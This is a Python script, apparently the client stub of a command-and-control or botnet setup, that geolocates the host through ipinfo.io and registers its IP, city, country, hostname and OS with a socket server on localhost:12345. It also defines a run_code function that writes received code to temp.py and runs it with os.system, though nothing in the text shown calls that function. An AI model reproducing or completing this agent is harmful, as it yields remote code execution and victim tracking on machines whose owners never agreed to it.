import socket
import json
import os

import requests

def get_ip_info():
    response = requests.get('https://ipinfo.io')
    data = response.json()
    return {
        'ip': data.get('ip'),
        'city': data.get('city'),
        'country': data.get('country'),
        'hostname': socket.gethostname()
    }

def run_code(code):
    # ghi code vào file
    with open('temp.py', 'w') as f:
        f.write(code)
    # chạy file
    os.system('python temp.py')
    

# Create a socket object
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to the server
server_address = ('localhost', 12345)
client_socket.connect(server_address)
ip_info = get_ip_info()
command = {
    'cmd': 'add',
    'result': {
        'name': os.name,
        'ip': ip_info['ip'],
        'city': ip_info['city'],
        'country': ip_info['country'],
        'hostname': ip_info['hostname']
    }
}
print(command)
json_command = json.dumps(command)
client_socket.sendall(json_command.encode())

import time
time.sleep(600)
    
        